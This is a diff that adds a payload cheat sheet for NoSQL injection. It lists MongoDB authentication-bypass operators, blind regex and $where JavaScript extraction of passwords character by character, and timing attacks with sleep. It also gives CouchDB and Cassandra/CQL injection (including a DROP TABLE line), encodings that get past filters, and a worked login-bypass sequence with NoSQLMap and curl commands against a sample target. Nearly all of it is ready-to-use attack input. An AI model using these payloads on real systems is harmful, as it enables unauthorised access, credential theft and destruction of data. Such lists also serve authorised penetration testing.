@@ -1,0 +1,247 @@
+# NoSQL Injection Payloads
+
+## ========================================
+## MONGODB AUTHENTICATION BYPASS
+## ========================================
+
+# JSON Payloads
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+{"username": {"$exists": true}, "password": {"$exists": true}}
+{"username": {"$in": ["admin", "administrator"]}, "password": {"$ne": null}}
+
+# URL Encoded
+username[$ne]=admin&password[$ne]=pass
+username[$gt]=&password[$gt]=
+username[$regex]=.*&password[$regex]=.*
+username[$exists]=true&password[$exists]=true
+
+# With admin user
+{"username": "admin", "password": {"$ne": null}}
+{"username": "admin", "password": {"$gt": ""}}
+
+## ========================================
+## BOOLEAN-BASED INJECTION
+## ========================================
+
+# True conditions
+username=admin&password[$ne]=wrong
+username[$eq]=admin&password[$ne]=wrong
+username[$nin][]=wrong&password[$nin][]=wrong
+
+# Regex attack
+username[$regex]=^a.*&password[$ne]=wrong
+username[$regex]=^ad.*&password[$ne]=wrong
+username[$regex]=^adm.*&password[$ne]=wrong
+
+## ========================================
+## MONGODB OPERATORS
+## ========================================
+
+# Comparison
+$eq   // Equal
+$ne   // Not equal
+$gt   // Greater than
+$gte  // Greater than or equal
+$lt   // Less than
+$lte  // Less than or equal
+$in   // In array
+$nin  // Not in array
+
+# Logical
+$and
+$or
+$not
+$nor
+
+# Element
+$exists
+$type
+
+# Evaluation
+$regex
+$where
+
+## ========================================
+## BLIND NOSQL INJECTION
+## ========================================
+
+# Extract username length
+username[$regex]=^.{1}$&password[$ne]=wrong  // False
+username[$regex]=^.{2}$&password[$ne]=wrong  // False
+username[$regex]=^.{5}$&password[$ne]=wrong  // True
+
+# Extract characters
+username[$regex]=^a.*&password[$ne]=wrong
+username[$regex]=^ad.*&password[$ne]=wrong
+username[$regex]=^adm.*&password[$ne]=wrong
+
+# Script enumeration
+username[$where]=this.username.length==5&password[$ne]=wrong
+
+## ========================================
+## JAVASCRIPT INJECTION ($where)
+## ========================================
+
+# Sleep/Time-based
+{"$where": "sleep(5000)"}
+{"$where": "var d=new Date(); do{var cd=new Date();}while(cd-d<5000);"}
+
+# Boolean-based
+{"$where": "this.username=='admin'"}
+{"$where": "this.password.length==5"}
+
+# Extract data
+{"$where": "this.username.match('^a.*')"}
+{"$where": "this.password.substring(0,1)=='a'"}
+
+## ========================================
+## NOSQL INJECTION IN JSON APIs
+## ========================================
+
+# POST Request Body
+{
+  "username": {"$ne": null},
+  "password": {"$ne": null}
+}
+
+{
+  "user": {"$regex": "admin"},
+  "pass": {"$gt": ""}
+}
+
+{
+  "email": {"$gt": ""},
+  "password": {"$gt": ""}
+}
+
+## ========================================
+## COUCHDB INJECTION
+## ========================================
+
+# Authentication Bypass
+username=admin&password[$gt]=
+
+# Map/Reduce Injection
+{
+  "map": "function(doc){if(doc.password){emit(doc.username, doc.password)}}"
+}
+
+## ========================================
+## CASSANDRA INJECTION
+## ========================================
+
+# Authentication Bypass (CQL Injection)
+username' OR '1'='1
+username'; DROP TABLE users;--
+
+## ========================================
+## PAYLOAD VARIATIONS
+## ========================================
+
+# URL Parameter Injection
+?username[$ne]=admin&password[$ne]=pass
+?search[$regex]=^admin
+?filter[$where]=this.price<100
+
+# Cookie Injection
+session={"username":{"$ne":null}}
+auth={"user":{"$regex":"admin"}}
+
+# Header Injection
+X-User: {"$ne": null}
+Authorization: {"token": {"$gt": ""}}
+
+## ========================================
+## BYPASS TECHNIQUES
+## ========================================
+
+# Different encoding
+username[$ne]=null
+username%5B%24ne%5D=null
+
+# Array syntax
+username[0][$ne]=admin
+username[][0][$ne]=admin
+
+# Nested operators
+{"username": {"$not": {"$eq": "admin"}}}
+
+## ========================================
+## ERROR-BASED INJECTION
+## ========================================
+
+# Trigger errors to leak information
+{"username": {"$where": "this.username.match('admin')"}}
+{"username": {"$type": 999}}
+
+## ========================================
+## TIMING ATTACKS
+## ========================================
+
+# Using JavaScript sleep
+{"$where": "sleep(5000) || true"}
+{"$where": "if(this.username=='admin'){sleep(5000)}"}
+
+# Conditional timing
+{"$where": "if(this.password[0]=='a'){sleep(5000)}"}
+
+## ========================================
+## EXPLOITATION EXAMPLES
+## ========================================
+
+# Extract admin password character by character
+POST /api/login
+{
+  "username": "admin",
+  "password": {"$regex": "^a"}
+}
+# If success, first char is 'a'
+
+{
+  "username": "admin",
+  "password": {"$regex": "^ab"}
+}
+# Continue until full password found
+
+# Bypass authentication
+POST /api/login
+Content-Type: application/json
+
+{
+  "username": {"$ne": null},
+  "password": {"$ne": null}
+}
+
+## ========================================
+## PROTECTION BYPASS
+## ========================================
+
+# If brackets are filtered
+username%5B%24ne%5D=admin
+username\u005B$ne\u005D=admin
+
+# If $ is filtered
+username[%24ne]=admin
+
+# Alternative operators
+{"username": {"$not": {"$type": 2}}}
+
+## ========================================
+## TOOLS
+## ========================================
+
+# NoSQLMap
+python nosqlmap.py -u http://target.com/login -p username,password
+
+# Burp Suite
+# Use Burp Intruder with NoSQL payloads
+
+# Manual Testing
+# Use Burp Repeater or curl
+
+curl -X POST http://target.com/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
